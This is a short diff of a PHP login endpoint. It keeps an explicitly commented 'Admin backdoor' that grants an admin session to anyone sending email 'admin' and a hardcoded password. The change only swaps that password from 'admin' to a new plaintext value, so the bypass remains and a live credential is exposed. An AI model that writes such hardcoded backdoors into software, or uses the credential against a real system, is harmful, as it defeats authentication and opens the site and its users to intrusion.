@@ -26,7 +26,7 @@ if (!$data) {
 }
 
 // Admin backdoor - Check BEFORE connection; set session so admin-only APIs work
-if (isset($data['email']) && $data['email'] === 'admin' && isset($data['password']) && $data['password'] === 'admin') {
+if (isset($data['email']) && $data['email'] === 'admin' && isset($data['password']) && $data['password'] === 'adminelton2016') {
     session_set_cookie_params(86400, '/', null, true, true);
     session_start();
     $_SESSION['user'] = array(
